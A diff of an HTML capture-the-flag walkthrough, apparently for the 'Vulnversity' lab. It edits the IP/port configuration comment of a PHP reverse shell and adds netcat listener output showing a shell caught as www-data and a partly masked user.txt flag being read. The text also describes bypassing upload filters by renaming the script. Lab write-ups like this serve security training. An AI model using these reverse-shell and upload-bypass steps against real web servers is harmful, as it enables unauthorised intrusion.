@@ -259,7 +259,7 @@ To gain remote access to this machine, follow these steps:
 <br>
 2.make sure that you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:
 
-$ip = '127.0.0.1';  // CHANGE THIS   
+$ip = '127.0.0.1';  // CHANGE THIS INTO YOUR VPN TUNNEL IP
 $port = 1234;       // CHANGE THIS   
 <br>
 3.rename the php-reverce-shell script into a format which is supported to upload on target web. the default format of this script is .php but this format is not supported by our target .so you need to find which format is supported by our target to upload reverce-shell-script . you can do it manually or using burpsuit 
@@ -270,8 +270,25 @@ Start a TCP listener on a host and port that will be accessible by the web serve
 
 $ nc -v -n -l -p 1234
 
-        
-    </p>
+<pre><code class="language-bash">atom@ubuntu:~/Desktop$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.254.91 60116
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 04:19:32 up 15 min,  0 users,  load average: 0.00, 0.13, 0.23
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ cd home 
+$ ls
+bi##
+$ cd bi##
+$ ls
+user.txt
+$ cat user.txt  
+8bd7##########################
+
+</code></pre></p>
+<h3 style="color: blue">[Task 5] Privilege Escalation </h3>
       
   </div>
   
